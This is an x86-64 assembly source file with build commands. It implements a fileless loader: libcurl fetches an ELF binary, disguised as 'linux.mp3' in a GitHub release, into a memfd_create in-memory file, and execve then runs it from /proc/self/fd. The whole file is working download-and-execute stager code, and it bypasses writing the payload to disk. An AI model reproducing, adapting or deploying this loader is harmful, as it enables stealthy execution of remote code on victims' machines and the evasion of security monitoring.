; linuxthor
;
; libcurl download ELF to memfd and exec it 
;
; assemble with:
; nasm -f elf64 -o curlmem.o curlmem.asm
; gcc curlmem.o -no-pie -o curlmem -lcurl
;

BITS 64

extern curl_global_init, curl_easy_init, curl_easy_perform
extern curl_easy_setopt, curl_easy_cleanup, curl_global_cleanup
extern fdopen

%define CURL_GLOBAL_ALL         3
%define CURLOPT_URL             10002
%define CURLOPT_WRITEDATA       10001
%define CURLOPT_USERAGENT       10018
%define CURLOPT_FOLLOWLOCATION  52

global main
global mem_func

main: 
    push rbp
    mov rdi, CURL_GLOBAL_ALL 
    xor eax, eax              
    call curl_global_init
    pop rbp

    push rbp
    call curl_easy_init
    pop rbp

    mov  [curly], rax

    mov  rax, 319                               ; memfd_create
    mov  rdi, mfd
    mov  rsi, 0
    syscall

    add [pfd+14], rax

    push rbp
    mov  rdi, rax
    mov  rsi, md
    xor  eax, eax
    call fdopen
    pop rbp

    push rbp
    mov rdx, rax
    mov rdi, [curly]
    mov rsi, CURLOPT_WRITEDATA
    xor eax, eax
    call curl_easy_setopt
    pop rbp
  
    push rbp
    mov rdi, [curly]
    mov rsi, CURLOPT_URL               
    mov rdx, url
    xor eax, eax
    call curl_easy_setopt
    pop rbp    

    push rbp
    mov rdi, [curly]
    mov rsi, CURLOPT_USERAGENT
    mov rdx, ua
    xor eax, eax
    call curl_easy_setopt
    pop rbp

    push rbp
    mov rdi, [curly]
    mov rsi, CURLOPT_FOLLOWLOCATION
    mov rdx, 1
    xor eax, eax
    call curl_easy_setopt
    pop rbp

    push rbp
    mov rdi, [curly]
    xor eax, eax 
    call curl_easy_perform
    pop rbp 

    push rbp 
    mov rdi, [curly]
    xor eax, eax
    call curl_easy_cleanup
    pop rbp

    push rbp
    call curl_global_cleanup
    pop rbp

    mov rax, 59                               ;  sys_execve
    mov rdi, pfd
    mov rsi, 0
    mov rdx, 0
    syscall

    xor eax, eax                              ; shouldn't get here
    ret                                      

section .data
    url db 'https://github.com/linuxthor/odds-and-ends/releases/download/0.1/linux.mp3',0 
    ua  db 'libcurl/asm',0 
    pfd db '/proc/self/fd/0',0
    mfd db 'musty',0
    md  db 'r+',0

section .bss
    curly resq 1

